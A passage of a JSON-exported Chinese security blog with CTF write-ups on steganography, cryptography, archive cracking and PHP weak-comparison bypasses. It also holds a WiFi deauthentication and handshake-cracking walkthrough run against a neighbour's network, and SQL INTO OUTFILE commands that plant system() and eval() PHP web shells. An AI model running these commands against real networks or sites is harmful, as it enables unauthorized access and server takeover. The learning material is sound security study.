输入即可","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"密码学基础题目","slug":"密码学基础题目","date":"2017-08-25T03:30:02.000Z","updated":"2017-10-24T16:18:17.000Z","comments":true,"path":"2017/08/25/密码学基础题目/","link":"","permalink":"http://Merl1ng.com/2017/08/25/密码学基础题目/","excerpt":"snake所给图片是一只蛇的照片 格式为jpg","text":"snake所给图片是一只蛇的照片 格式为jpg binwalk 发现 rar -e拿到压缩包 这里补一个不用binwalk 分析的方法 winhex打开图片 因为是jpg文件所以文件头是FFD8，文件尾是FFD9 查看它们，发现此图片文件有文件尾FFD9，但不是在最后 则可能有隐写 改为zip或者rar 当然还是binwalk最快… 解压 rar 得到 key 和 cipher key里base64 解密得到明文：What is Nicki Minaj’s favorite song that refers to snakes?百度一下，得key:anaconda 当时这里犯了一个错误 原因是密码学的了解太少 对 cipher 这个单词不敏感 以为这玩意没用 而用 蛇的图片 作为被加密的文件用key去解密 事实上 cipher 才是密文 那么现在我们有了密文和公钥 其中公钥加密最著名的就是AES 百度之 发现AES加密的一种算法叫做 SERPENT 而这个单词正是蛇的意思 故到相关网站进行解密 拿到flag 最后贴一张昨天打到周榜第一的截图 haha 希尔密码在线代的课本上出现了一堆神秘字母 dloguszijluswogany 而旁边的矩阵是 1 20 1 根据字典序将字母转化为数字(0-25) 设定密钥矩阵(n*n)，将明文转化为r n的矩阵 将明文矩阵与密钥矩阵相乘即可得到密文矩阵(结果模26)，再将其转化为字母即可 原理及代码实现可以看这篇 http://xmwen1.blog.51cto.com/10730069/1751672 d l o g u s z i j 3 11 14 6 20 18 25 8 9l u s w o g a n y 11 20 18 22 14 6 0 13 14 1 2 的逆矩阵为 -1 -20 1 0 1 相乘 取模 再转换成字母 ansi解码有一道web题经过一些步骤来到了一个页面 但是显示404 这里查看源码就能看到 1234567891011&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"white\"&gt;&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;&lt;!-- ┼攠數畣整爠煥敵瑳∨灯捲≤┩&gt; --&gt;&lt;/body&gt;&lt;/html&gt; ┼攠數畣整爠煥敵瑳∨灯捲≤┩&gt;有一句注释，熟悉的人就知道是一句话木马 这是ANSI转Unicode而得到的 解密方法 复制到记事本里另存为 编码选上 Unicode 用WinHex等可以查看16进制的软件，直接打开即可 如果想显示正常，把开头的FF FE两个字节删了，再用记事本打开就看到了原理是：Windows平台下默认的Unicode编码为Little Endian的UTF-16，UTF-16就需要通过在文件开头以名为BOM（Byte Order Mark）的字符来表明文件是Big Endian还是Little Endian。BOM为U+FEFF这个字符 ANSI转Unicode工具 a2u4hack.exe 它常用来对一句话木马进行变形 比如这里 http://www.91ri.org/1126.html tips有关密码学加密总结可以看这篇 http://www.360doc.com/content/16/0906/21/27425026_588911412.shtml很多偏门的也涉及到了 U2FsdGVkX1 开头的密文是对称加密 AES / DES ascii码的二进制表示是7位","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://Merl1ng.com/tags/crypto/"}]},{"title":"压缩包密码破解","slug":"压缩包密码破解","date":"2017-08-23T14:38:01.000Z","updated":"2017-09-22T15:37:06.298Z","comments":true,"path":"2017/08/23/压缩包密码破解/","link":"","permalink":"http://Merl1ng.com/2017/08/23/压缩包密码破解/","excerpt":"zip已知明文攻击题目为一个加密的压缩包和一个tips.txt文本","text":"zip已知明文攻击题目为一个加密的压缩包和一个tips.txt文本 文本里写着 密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！ 这要暴力破解至少一晚上 winhex 打开 加密压缩包 发现里面也有 tips.txt 文件 故可以采用已知明文攻击 用azpr 注意在Mtf1y@后面还有四个空格…. winrar密码破解题目如下 Tips winrar, password crack, 65h – 71h以下是一段16进制字符串 526172211A0700CF907300000D0000000000000056947424965E00600000004900000002E3B1696DEE413D3B1D33310020000000C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD234784B6DD58B0A427929591366006C6F7665002E7478742E2E5B7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D16712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F142EC43D7B00400700 key是解压后的txt文件的sha1值(取前8位) 首先复制16进制代码到winhex 发现是 rar 文件 保存 这里只能用winrar解压 (修不修复都行) 用好压等等会直接报错 解压会提示输入密码 结合题目 tips 65h–71h 这里指的是winhex的偏移 (十六进制) 注意这里我的winhex左侧是以十进制的表示的 故对我来说 需要先把64和71转化为16进制 即101–113 如果左侧以十六进制计数 则不需要转换 选中101–113 复制 ascii值即为压缩包密码 剩下把文件拖进 MultiHasher 里就能看到 sha1值 这里 输入65h–71h解压成功据说是破解了winrar的加密 但是也可能是巧合 真实性还有待考证 以下内容最初来自看雪 实例1： 第一步：用winhex将下面数据生成rar格式的文件。 526172211A0700CF907300000D0000000000000056947424965E00600000004900000002E3B1696DEE413D3B1D33310020000000C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD234784B6DD58B0A427929591366006C6F7665002E7478742E2E5B7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D16712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F142EC43D7B00400700 第二步：在winhex中取65h-71h一段数据ctrl+c后粘贴到密码输入框点确定完成秒破。（实例一） 实例2： 526172211A0700CE997380000D00000000000000395B7A2D7B7D2E2ED417190FDC99688612D2B31773CD93FE082F30D3229C8F77F51B936AD003E65AADF605471FA4ED0E3655748BCC8F5FA5BFDE4651275A2AA306CB7999C579C249C5AF56A0D3744BD7A695586FEF9FB1AB146CA80DED886936DE3AB003EC44215BA8497E4C1A974D45810C8F1277726881548FBAB842BCF9E17B815C116260ADFEB9151DF97C6F93A673629691B767F883950018B7DE7C0D86FFF04A10905E32BD1DB015B709A298DB8D2C42DF23A131F2AD999AA3BB2316F031C5115c179a2f877a41393761683939 选中14h-1bh一段数据ctrl+c后粘贴到密码输入框中后面再加上dch-e3h处的ASCII字符，确定后即秒破了 原理分析： RAR加密的原理，是将UNICODE格式的密码，与随机生成的一个8字节的SALT连在一起，根据它生成AES算法的密钥来进行加密。而加密后的RAR中，除了加密后的原压缩内容之外，文件头结构还保存了这个SALT值用于解密。原则上SALT的生成过程跟用户输入时的密码一点关系都没有，因此它本来不保存关于密码的显式信息，但是我们可以对WINRAR程序进行patch，使SALT跟密码发生直接联系，从而使这个SALT成为潜在的“后门”。由于SALT只有8个字节，所以对于8个字节以内的密码，可以直接保存在SALT中（或者简单的XOR一下或其他，反正可以用很容易的可逆的算法处理）。那么密码超出8字节怎么办？这里分为两种方式处理，分别是实例一和实例二。 实例一应该是利用了把文件头的HEAD_SIZE字段改大，这样文件头多出来的地方（WINRAR读取文件头时是跳过这部分的）就可以保存密码8字节以后的内容。实例一中的65h-6ch内容就是SALT，而6dh-71h就属于把HEAD_SIZE改大之后多出来的部分了。 但是实例一这种方法应用的前提是文件头没加密。如果文件头被加密（这时MAIN_HEAD的HEAD_FLAGS包含0x0080），那么 MAIN_HEAD后面紧跟着的就是SALT（实例二的14h-1bh内容），SALT后面则是被加密的所有内容（包括文件头）。那么怎么把密码8字节以 后部分搞进去？实例二的做法，我猜是因为加密过程是16字节为一组，加密后的内容也应该是16字节的倍数，所以解密时也以16字节为单位读取，当文件内容最后跟着一段小于16字节的数据时，WINRAR解密时直接无视这段数据。于是就可以把密码的后半部分放在文件最 后（但是不能超过16字节），这样用这种方法可以保存不超过23字节的密码。 原文是好几年前的找不到了 贴一篇转载的http://blog.renren.com/share/293299873/3434623501/0","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://Merl1ng.com/tags/crypto/"}]},{"title":"隐写工具大法","slug":"隐写工具大法","date":"2017-08-21T10:35:52.000Z","updated":"2017-10-21T15:16:58.762Z","comments":true,"path":"2017/08/21/隐写工具大法/","link":"","permalink":"http://Merl1ng.com/2017/08/21/隐写工具大法/","excerpt":"音频隐写 Mp3stego把所给图片扔binwalk","text":"音频隐写 Mp3stego把所给图片扔binwalk (图片很好看所以贴出来了(￣▽￣))发现zip文件 并且是 mp3 文件 -e 提取解压 得到 music.mp3 和一个txttxt里写这 key simctf 猜测 是密码 利用 Mp3stego 工具 cmder 切换到 Mp3stego文件夹下 把 music.mp3也放进去 然后 把Decode.exe拖到命令行里 输入如图所示 (-X是获取隐藏的东西 -P后面写密码) Brainfuck 和 Braintools题目提示 brainfuck 直接打开 bftools输入bftools.exe decode braincopter doge.jpg –output –out.png (doge.jpg是题目所给图片) 得到 out.png winhex打开看到 brainfuck 字符 去解密网站解密 得到 base64 再解密 拿 flag wbstego同样用来处理lsb 加密过的文件 在使用stegsolve不行时 利用wbstego 可以分离出 (图形界面) xxx._is 文件 outguess题目提示guess -&gt; outguess 隐写 吐槽一下 这个有点冷门 网上的介绍少之又少 找到一个用法但是只能在 linux 下 在linux里cd到outguess目录下sudo ./configure &amp;&amp; make &amp;&amp; make install(不加sudo 会提示权限不够 即使你是root) 这样就可以使用outguess命令了 自己输入个outguess就会显示其用法，看到这么一条-r retrieve message from data 所以只需要在angrybird.jpg所在目录下运行下面语句即可(angrybird.jpg为所给图片) outguess -r angrybird.jpg outfile.txt Steganography Software F5题目提示刷新 即F5 git 下输入 git clone https://github.com/matthewgao/F5-steganographycd F5-steganographyjava Extract ../123456.jpg -p 123456 (123456.jpg为所给图片)后会生成output.txt文件，里面就有flag了 tweakpng + Adobe Fireworks CS5题目要对png文件格式有所了解 png格式主要由六大块组成：文件头、IHDR块、PLTE块、tRNS块、IDAT块、文件尾文件头一般是 8950 4E47 0D0A 1A0A而本题提示中的IHDR块是png中用来描述图片的基本信息，格式是4字节Chunk_Length、4字节Chunk_Type、13字节Chunk_Data、4字节Chunk_CRC Chunk_Length：内容一般是13，决定了Chunk_Data的大小Chunk_Type：内容为49484452，代表”IHDR”Chunk_Data：4字节Width,4字节Hegiht,1字节BitDepth,1字节ColorType,1字节CompressionMethod,1字节FilterMethod,1字节InterlaceMethodChunk_CRC：把Chunk_Type和Chunk_Data合起来进行CRC校验 把图片扔到tweakpng里 会提示crc 错误 并且告诉你正确的 crc 这时进入winhex改掉就行了 但是到这里还是看不到flag 如果放到ps里会提示 这就要下载 Adobe Fireworks CS5打开图片 就可以找到flag Audition结合摩斯密码音频文件扔到 Audition (flac格式直接读不出来 先格式工厂转换为 wav) 左上角的几种图像选择都试一试(红框里面的) 将会看到 摩斯密码型的长短结合的图案 对照摩斯密码表进行解密 Comfy File Repair 修复文件题目为一张损坏的 png 文件 发现文件头不对 查一下对应16进制文件头为 89 50 4E 47 0D 0A 1A 0A 修改即可 还可以使用 Comfy File Repair 自动修复 gnuplot 自动画图给出的图片 放入winhex后发现 FFD9后面还有很多东西 单独贴出来 扔到nodepad++ 选中plugins-&gt;converter-&gt;hex转asciii 看到是坐标值 -&gt; 画图 但是这里注意虽然在notepad++下是一行一个的 但是默认记事本打开是挤在一起的 先把括号替换为无 复制到 word文档再复制回来 最后逗号替换为空格 就可以得到可利用文本 把这个xy.txt放到你安装gnuplot路径的demo文件夹内 进入gnuplot 输入 plot “xy.txt” 把二维码剪出来用ps处理下大小和颜色 扫描即可 如果是三维坐标 要 splot “xx.txt”","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"这些年遇到的隐写题","slug":"这些年遇到的隐写题","date":"2017-08-21T01:42:36.000Z","updated":"2017-10-22T15:54:49.085Z","comments":true,"path":"2017/08/21/这些年遇到的隐写题/","link":"","permalink":"http://Merl1ng.com/2017/08/21/这些年遇到的隐写题/","excerpt":"misc 1题目是两张看起来一模一样的图片 首先都binwalk分析了下 没有什么异常","text":"misc 1题目是两张看起来一模一样的图片 首先都binwalk分析了下 没有什么异常这里也不是lsb隐写 但是还是要用到神器stegsolve 在 stegsolve里打开第一张图片 选择Analyse–Image Combiner 第二张图 合成两个图片 点左右箭头 当切换到 SUB 时发现二维码 save 保存(这里注意默认保存格式是bmp 需要改为png不然之后的二维码色阶过低扫不出来) 附bmp和png在后续操作后的对比图 观察二维码需要反色 在ps里 ctrl+i 反色 保存后再用 stegsolve 打开 左右箭头切换通道 可以看到三张十分清晰的二维码 分别扫描之 结果分别为DES6XaMMbM7U2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ/+lHBsjpv1BwwEawMo1c= 找一个解密网站解密 拿到 flag 这题纯用ps也能扫出来 但是操作比较繁琐 misc 2这道题比较容易一点 只记录重点的部分 在经过一些操作之后得到了一个a.gif文件 但是用winhex打开发现没有gif文件头导致文件打不开 在winhex增加文件头 查了一下是 47 49 46 38(edit -&gt; paste zero bytes -&gt;4)后来才知道直接notepad++ 打开 加上GIF8就行了 现在就可以查看图片了 但是图片播放速度过快 还是使用stegsolve analyse–frame browser 一帧一帧查看 (图片播放速度设置过慢也可以用这种方法) misc 3当发现所给图片感觉被强行截断 没有显示完全 (感觉显示完全其他方法不行也试一试..别问我为啥) 考虑是否被修改了图片分辨率即尺寸被缩小了 导致没有完全显示 明显感觉到该图片下面还有东西 放到winhex 图中红框内的分别代表图片的宽度和高度 将高度改大一点 比如改为05 00 看到了 flag 补充如果改完大小也没有 可能是因为与背景色重合了 win10默认图片打开方式背景色是黑的 如果flag也是黑的就看不到 所以还要试一试用画图打开 这时背景色是白色的 就能看到flag 比如这道题… 漆黑一片 misc 4挺复杂的一道题目 也使我对stegsolov的用法也有了更加深入的了解 原图是这个样子的 处理这个题目有两种方法 方法一打开后 调到blue plane 0 发现左上角有一行奇怪的东西 这时只勾选 blue 的最低位 和右边的lsb 看到 modernwarfare 再根据题目要求用md5加密就得到答案(modernwarfare是现代战争的意思 让我回想起了当年打coc的时光 ) 方法二这次不调到 blue 调到 gray bits 是的 也有一行东西 只不过这时要借助脚本提取 save 为solve.bmp 123456789from PIL import Imageflag_img = Image.open(\"solved.bmp\")w,h = flag_img.sizemsg=''for x in range(0, flag_img.size[1]): g,b,a = flag_img.getpixel((x,0)) if g==255: msg +='0' else: msg+='1'print msg 将二进制复制保存为 bin.txt(方便后续解码) 后记其实在 random color map 下会因为左右移动颜色的改变也显示出那一行东西 不知道能不能在那提取 misc 5发现有一堆文件 文件名为xaa–xcz winhex打开发现第一个文件头有png 就一行命令 Windows下切换到文件目录copy /B x* xx.png 将所有x打头文件以二进制方式复制，至xx.png FireWork打开图片，将二维码图层另存为其它文件，用QR Research软件即可识别 misc 6有时候 lsb 勾选column 比如这个 首先在 blue0 里发现奇怪的东西 猜测lsb 但是往常默认勾选 row 并无可利用内容 应该勾选 colume 看到了 key (原理真滴不清楚…s) misc 7题目如图 winhex打开发现以zip格式结尾 但此时binwalk不行 直接将图片格式改为zip 解压发现需要密码(当然这一步在winhex里搜索504b0304找到末尾的Zip头，然后贴出来，保存为zip也可以) 很显然图中信息就是密码 我这里直接根据图片内容猜测为8位纯数字或者四位字符(考虑ascii码) 爆破1s就出来了 当然试的话其实是把图片倒过来ascii码 但是YZ为啥互换不着… 解压得到txt 里面写着 42433331 这尼玛是什么… 后来才知道winhex做会误解 因为这其实是摩斯… 用010 editor 打开就很明显了 而那串数字就是分割方式 misc 8需要知识 gif 文件结尾为 003B 值为0x3B 符号为 ; 这题迷惑性蛮大的 图片是一个gif binwalk提示以zip结尾 winhex打开倒着看 有 nvshen.jpg显示出来 且发现有 504B0102 以为就是这里但是格式故意错了 改成504B0304却发现没用 原来事情没有这么简单 搜了一下504B发现有好几处 但其他地方不是0102 是比较乱的字符 又百度了一下504B0102 好像还真有这个 又看了一下后面有 3F00 1400 0100 很容易联想到伪加密 把0100 改成0000 又试了试 还不行 Orz.. 这里就必须要了解 gif的文件尾 winhex搜索 003B 找到 gif文件的结尾 并且这里 也显示了隐藏的图片 nvshen.jpg 原来最下面的那个是个幌子 看到了 love 要知道没有无缘无故的爱 这玩意估计是解压密码 love 即6C6F7665 后面是14000100 很符合zip 把love的hex 替换为 504B0304 就可以了 解压提示密码 即 love 就可以拿到隐藏的图片","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"hbctf第十场writeup","slug":"hbctf第十场writeup","date":"2017-08-19T09:49:10.000Z","updated":"2017-08-31T02:44:36.085Z","comments":true,"path":"2017/08/19/hbctf第十场writeup/","link":"","permalink":"http://Merl1ng.com/2017/08/19/hbctf第十场writeup/","excerpt":"misc:flag.png给了一张png图","text":"misc:flag.png给了一张png图 winhex看看 png 头 再用 binwalk 也没看出来什么 虽然有zlib 但是由于png图片主体是由zlib压缩的 并不能直接确定(大多数情况下先忽略zlib) 当然这玩意也偶尔有用… 这时用脚本解压 1234567891011121314from PIL import Imagefrom zlib import * data = open('xxx.PNG','rb').read()[0x15AFFB:]data = decompress(data) img = Image.new('1', (25,25))d = img.load() for n,i in enumerate(data): d[(n%25,n/25)] = int(i)*255 f = open('1.png','wb')img.save(f) 回到此题猜测 lsb隐写 放到stegslove 先试试左右箭头查看RGB无果后选择 analyse Data extract按照图示选择save bin 再次放到winhex 显示 pk头 改后缀好压可以直接解压 得到 flag的后半部分 如果用的是winrar直接解压会报错 需要先点击修复选项 接下来寻找flag前半部分 利用后半部分的图片尝试lsb 这次明显不是再次binwalk (lsb得到的图片也叫 flag.png)发现其实有两个png图片用 binwalk “-D=png” flag.png得到flag前半部分 补充一道类似的lsb隐写题目拿到一张图 lsb隐写同样 save bin 但是这次显示的是 pt头 这时我们使用一个github上一个工具来处理-cloacked-pixe 然后使用命令python lsb.py extract 1.png 1.txt 123456可以得到隐写的文件1.txt。ps:extract指的是提取 1.png指的是导入文件名 （用原图）1.txt指的是导出文件名 123456指的是密码（此处根据题目的提示弱密码猜测） 具体参考 http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1 再补一个lsb的知识点如果所给图片格式不为png 比如是bmp等等这时在stegslove左右箭头查看RGB可能没有东西 可以先扔ps另存png 再用stegslove查看 没准就能看到 forensics:listen音频隐写题目 winhex打开文件头是 riff 搜了一下可能是 wav文件 结合题目listen 将后缀改为 wav听了一下贼刺耳又搜到 可能是音频倒放专门去下载了 Adobe Audition 倒放了一下试试 结果啥都没 正确解法去kailsox -t wav transmission -esigned-integer -b16 -r 22050 -t raw - | multimon-ng -A –得到flag 出题人给的生成方法 ./ax25beacon -s “WDPX01” -o transmission – 37.780963 -122.392227 0","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"php弱匹配和json","slug":"php弱匹配和json","date":"2017-08-12T16:17:39.000Z","updated":"2017-09-01T05:11:37.552Z","comments":true,"path":"2017/08/13/php弱匹配和json/","link":"","permalink":"http://Merl1ng.com/2017/08/13/php弱匹配和json/","excerpt":"其实很早就了解过php弱类型匹配 最近在看以前的writeup时又遇到了结合ctf总结一下","text":"其实很早就了解过php弱类型匹配 最近在看以前的writeup时又遇到了结合ctf总结一下 在PHP中有两种比较方式 == 和 === == 在使用时会出现一些问题如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 1234567var_dump(\"admin\"==0); var_dump(\"1admin\"==1); var_dump(\"admin1\"==0);var_dump('some string' == 0);var_dump('123fg456'==123);var_dump(123.0 == '123d456');var_dump(\"1\" == \"01\"); 进行hash比较的时候同样12var_dump(\"0e123456\"==\"0e4456789\");var_dump(\"1\" == \"1e0\"); 还存在一种十六进制余字符串进行比较运算时的问题当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等12var_dump(\"0x1e240\"==\"123456\");var_dump(\"0x1e240\"==123456); 这些代码的输出结果全是bool(true) (var_dump() 能打印出类型) ctf中的运用 md5绕过12345678910111213141516&lt;?phpif (isset($_GET['Username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $Username = $_GET['Username']; $password = $_GET['password']; if (!ctype_alpha($Username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($Username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo \"successful\"; &#125;else&#123; echo \"login failed!\"; &#125; &#125;?&gt; 题目大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过 json绕过123456789101112131415&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key =\"*********\"; if ($message-&gt;key == $key) &#123; echo \"flag\"; &#125; else &#123; echo \"fail\"; &#125; &#125; else&#123; echo \"~~~~\"; &#125;?&gt; 输入一个json类型的字符串，json_decode函数解密，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过 最终payload message={“key”:0} 补充 json_decodejson_decode(PHP 5 &gt;= 5.2.0, PECL json &gt;= 1.2.0) json_decode — 对 JSON 格式的字符串进行编码 说明mixed json_decode ( string $json [, bool $assoc ] )接受一个 JSON 格式的字符串并且把它转换为 PHP 变量参数json待解码的 json string 格式的字符串。assoc当该参数为 TRUE 时，将返回 array 而非 object 例子12345&lt;?php $json = '&#123;\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5&#125;'; var_dump(json_decode($json)); var_dump(json_decode($json, true)); ?&gt; 将输出123456789101112131415object(stdClass)#1 (5) &#123; [\"a\"] =&gt; int(1) [\"b\"] =&gt; int(2) [\"c\"] =&gt; int(3) [\"d\"] =&gt; int(4) [\"e\"] =&gt; int(5) &#125; array(5) &#123; [\"a\"] =&gt; int(1) [\"b\"] =&gt; int(2) [\"c\"] =&gt; int(3) [\"d\"] =&gt; int(4) [\"e\"] =&gt; int(5) &#125; strcmp漏洞绕过 php -v &lt;5.312345678910&lt;?php $password=\"***************\" if(isset($_POST['password']))&#123; if (strcmp($_POST['password'], $password) == 0) &#123; echo \"Right!!!login success\";n exit(); &#125; else &#123; echo \"Wrong password..\"; &#125;?&gt; strcmp是比较两个字符串，如果str1","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"json","slug":"json","permalink":"http://Merl1ng.com/tags/json/"}]},{"title":"hexo自定义主页","slug":"hexo自定义主页","date":"2017-08-10T08:34:10.000Z","updated":"2017-08-19T09:50:10.669Z","comments":true,"path":"2017/08/10/hexo自定义主页/","link":"","permalink":"http://Merl1ng.com/2017/08/10/hexo自定义主页/","excerpt":"一直就想给博客加个自己的首页看到了喜欢的特效就毫不犹豫的动手了","text":"一直就想给博客加个自己的首页看到了喜欢的特效就毫不犹豫的动手了 其实如果有云服务器就不用这么麻烦了 以下操作前提是在github的博客 首先有一个自己的域名 并且解析到你已经搭建好的github博客地址 (yourname.github.io) 新建一个repository 这里我命名为 Home-page根据提示在git下复制代码进去 到域名注册的地方新增一个二级域名解析 同样指向你的github博客地址然后在Home-page新建文件CNAME 把你的二级域名写进去 Home-page里到setting 再到 github page 新建一个页面 此时将指向你的二级域名 把你喜欢的首页改名为index.html放到 Home-page 里面 (首页里超链接指向博客 废话)index文件里引用的css jpg等等 直接放到云上比较方便 然后把herf改成外链 到这里你的自定义首页就完成了我这里首页是 blog.merl1ng.cc 博客是 merl1ng.cc 但是问题又来了 因为是先绑的顶级域名 首页和博客的域名交换一下比较好 这里域名的解析不用改 只用到github上把两个仓库根目录的CNAME文件里的域名交换一波把index.html里的超链接改一下(不改一直指向自己)最后把本地hexo文件夹的source里的CNAME域名也改一下就完成了 最终的效果 首页为 merl1ng.cc 博客 blog.merl1ng.cc这样看起来比较舒服(≧∇≦)ﾉ 将来如果再新建别的二级域名 这个格式也比较方便","categories":[{"name":"setting","slug":"setting","permalink":"http://Merl1ng.com/categories/setting/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://Merl1ng.com/tags/hexo/"}]},{"title":"wifi破解","slug":"wifi破解","date":"2017-08-07T15:47:44.000Z","updated":"2017-08-13T06:12:04.063Z","comments":true,"path":"2017/08/07/wifi破解/","link":"","permalink":"http://Merl1ng.com/2017/08/07/wifi破解/","excerpt":"订的tl-wn722n网卡终于到了 插上用了一下在kail下确实免驱 根据教程抓到了握手包 但是字典不够大 没把密码跑出来","text":"订的tl-wn722n网卡终于到了 插上用了一下在kail下确实免驱 根据教程抓到了握手包 但是字典不够大 没把密码跑出来在虚拟机中的可移动设备上连接该网卡首先 airmon-ng 检测是否正常识别 开启网卡监听模式 airmon-ng start wlan0 开始扫描周围AP即wifi信号 airodump-ng wlan0mon 选择一个wifi 记录BSSID和CH这里我选的是附近信号较强的名为 决战到天亮 (图中显示有点乱码) 发起攻击并写入握手包文件输入airodump-ng -c 1 –bssid 70:AF:6A:93:7A:17 -w /root/Desktop wlan0mon 会在下方出现 路由器的mac 和客户端的mac 进行记录 (测试中有出现过不显示的情况)同时打开另外一个终端 强制用户断开wifi重连输入 aireplay-ng -0 6 -a 70:AF:6A:93:7A:17 -c 84:D8:AC:23:CA:65 wlan0mon(即上述记录的两个mac) 当出现WPA handshake 即代表握手包抓取成功 这时之前的监听可以关了(airmon-ng stop wlan0mon关闭网卡监听模式) 将字典放在同一目录下输入aircrack-ng -w z1.txt Desktop-*.cap (z1.txt为字典) 开始破解能不能跑出来就看字典大小了 最好提前社工一波","categories":[{"name":"lan","slug":"lan","permalink":"http://Merl1ng.com/categories/lan/"}],"tags":[{"name":"wifi","slug":"wifi","permalink":"http://Merl1ng.com/tags/wifi/"}]},{"title":"php结合sql注入","slug":"php结合sql注入","date":"2017-08-03T11:19:17.000Z","updated":"2017-08-03T13:30:25.941Z","comments":true,"path":"2017/08/03/php结合sql注入/","link":"","permalink":"http://Merl1ng.com/2017/08/03/php结合sql注入/","excerpt":"利用sql注入不仅能够查找数据库中指定数据 获取flag在渗透网站时利用sql结合php语句注入拿到shell","text":"利用sql注入不仅能够查找数据库中指定数据 获取flag在渗透网站时利用sql结合php语句注入拿到shell php注入漏洞使用sql语句漏洞 需要先了解php注入漏洞 PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz! DedeCMS等都曾经存在过该类型漏洞 System：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下： string system(string command, int &amp;return_var) 其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。 按照PHP程序员的想法，命令执行函数的主要作用是可以通过命令执行函数与Web应用程序进行交互，通过Web应用程序执行外部程序或系统命令，如Web应用程序员想通过system函数获取指定目录的文件内容，那么他可以通过构造如下代码实现php页面有如下代码 &lt;? $cmd = $_GET[&quot;cmd&quot;];echo &quot;&lt;pre&gt;&quot;;system($cmd);echo &quot;&lt;/pre&gt;&quot;;?&gt; 而我们就可以在浏览器中访问该网站的这个php文件 并提交cmd的内容为“net start” 目的是通过命令注入攻击查看Web服务器主机都开启了哪些服务提交cmd内容为“phpinfo()” 查看当前php环境相关信息 在PHP中，可以实现执行外部程序或函数的命令执行函数包括5个函数 除了上面列出的这种 还有几种就不一一列举 结合sql语句拿shell渗透过程中如果发现网站使用了PhpMyAdmin 可以找到执行sql语句的地方还需要查看服务器信息 得到网站的路径假设网站路径为C:/UPUPW/UPUPW_K2.1_64/htdocs 写入如下代码12select load_file('C:/UPUPW/UPUPW_K2.1_64/htdocs/log.php');select '&lt;?php echo \\'&lt;pre&gt;\\';system($_GET[\\'cmd\\']); echo \\'&lt;/pre&gt;\\'; ?&gt;' INTO OUTFILE 'C:/UPUPW/UPUPW_K2.1_64/htdocs/log.php' 拿到cmd权限 现在只要在cmd=后面加上命令即可写入一句话再连接菜刀即可写入 echo ^&lt;^?php eval($_POST[qaq]);?^&gt;^ &gt;&gt;aa.php通过执行以下命令，即可在当前目录下产生一个文件名为aa.php。密码为qaq的webshell 参考文章http://www.rising.com.cn/newsletter/news/2012-06-27/11810.htmlhttps://www.server110.com/web_sec/201407/10799.html","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://Merl1ng.com/tags/sql/"},{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"若干sql注入","slug":"若干sql注入","date":"2017-08-02T14:56:28.000Z","updated":"2017-10-06T08:02:41.776Z","comments":true,"path":"2017/08/02/若干sql注入/","link":"","permalink":"http://Merl1ng.com/2017/08/02/若干sql注入/","excerpt":"正在学习sql注入 差不多完整理解了一些注入题把方法和思路记录下来(&gt;ω&lt;)","text":"正在学习sql注入 差不多完整理解了一些注入题把方法和思路记录下来(&gt;ω&lt;) Sql 1首先提交1 即?id=1 得到ID: 